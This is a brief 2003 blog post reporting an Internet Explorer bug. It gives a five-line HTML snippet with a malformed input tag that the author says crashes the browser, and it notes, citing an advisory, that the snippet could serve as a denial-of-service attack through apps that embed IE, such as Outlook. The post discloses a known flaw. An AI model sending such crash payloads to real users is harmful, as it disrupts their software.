---
layout: post
title: "Simple HTML Page Crashes IE"
comments: false
date: 2003-05-03 20:56:00
categories:
 - Technology
subtext-id: be5a1ab3-3e84-487c-9be7-fe6f6adc8d3f
alias: /blog/post/Simple-HTML-Page-Crashes-IE.aspx
---


This is interesting. Create a text file and put the following in it:
    
    <html>  
    <form>  
    <input type crash>  
    </form>  
    </html>

Save it as crash.html and open it in IE. BOOM! How the hell did something like this slip though QA? As the advisory mentions, since IE gets embedded in a number of apps (Outlook particularly), this could be used as a DOS attack.
